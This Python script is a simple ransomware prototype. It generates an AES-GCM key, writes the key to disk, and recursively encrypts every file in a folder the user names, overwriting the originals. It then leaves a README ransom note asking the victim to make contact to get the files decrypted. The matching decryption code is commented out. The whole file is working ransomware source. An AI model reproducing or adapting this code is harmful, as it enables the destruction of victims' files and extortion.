from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
import time
from pathlib import Path

key = AESGCM.generate_key(256)

# print(key)

markdown_content = """

## Contact me if you want your files to be decrypted :)
## CONTACT INFO


"""

with open("key", "wb") as key_file:
    key_file.write(key)

aes = AESGCM(key)

folder = input('Enter Folder to encrypt: ')

def encrypt_contents(folder_name):
        for file in folder_name.rglob("*"):
            if file.is_file():

                nonce = os.urandom(12)

                print(file)

                with open(file, "rb") as f:
                    content = f.read()

                encrypt = aes.encrypt(nonce, content, None)

                with open(file, "wb") as f:

                    f.write(nonce + encrypt)
            else:
                pass



#For Decrypting
# def decrypt_contents(folder_name):

#         for file in folder_name.rglob("*"):
#             if file.is_file():

#                  with open(file, 'rb') as f:
#                       content = f.read()

#                  nonce = content[:12]
#                  decrypt = content[12:]

#                  decrypt_file = aes.decrypt(nonce, decrypt, None)

#                  with open (file, "wb") as f:
#                       f.write(decrypt_file)



encrypt_contents(Path(fr"{folder}"))

with open(Path(fr"{folder}") / "README.md", "wb") as read:
     read.write(markdown_content.encode())

# decrypt_folder = input('Decrypt Folder? Y/N: ').lower()

# if decrypt_folder == "y":
#      decrypt_contents(Path(fr"{folder}"))